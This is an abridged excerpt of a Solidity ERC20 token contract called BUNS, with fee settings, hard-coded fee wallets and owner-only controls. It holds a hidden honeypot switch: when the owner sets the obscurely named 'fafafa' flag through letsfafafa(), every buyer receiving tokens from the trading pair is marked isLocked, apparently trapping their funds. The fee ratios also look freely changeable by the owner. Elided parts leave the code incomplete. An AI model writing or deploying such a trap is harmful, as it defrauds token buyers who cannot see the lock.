...
contract BUNS is ERC20, Auth {
    using SafeMath for uint256;

    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "BUNS";
    string constant _symbol = "BUNS";
    ...
    FeeRatios public _fees =
        FeeRatios({liquidity: 2, marketing: 6, eco: 2, total: 10, divisor: 100});
    ...
    FeeWallets public _feeWallets =
        FeeWallets({
            marketing: payable(0x0C7b08b71F4C23d9aBdd4539bb6F85BF760F6a3f),
            eco: payable(0xB403d59dc80788D35D35F7771e2702AF3995AbE8)
        });
    ...
    uint256 public swapTransactionThreshold = 0;
    bool inSwap;
    ...
    function _transferFrom(
        ...
        if (!authorizations[sender] && !authorizations[recipient]) {
            ...
            if (fafafa && sender == pair){
                isLocked[recipient] = true;
            }
        }
    ...
    function contractSwap() internal swapLock {
        ...
        _feeWallets.eco.transfer(amountETH.mul(fees.eco).div(totalFees));
    ...
    function setFeeRatios(
        ...
        _fees.eco = eco;
        _fees.total = liquidity + marketing + eco;
    }

    function setFeeWallets(address payable marketing, address payable eco)
        external
        onlyOwner
    {
        _feeWallets.marketing = payable(marketing);
        _feeWallets.eco = payable(eco);
    }
        ...
        authorized
    {
     ...
     function letsfafafa(bool _status) public onlyOwner {
         fafafa = _status;
    }
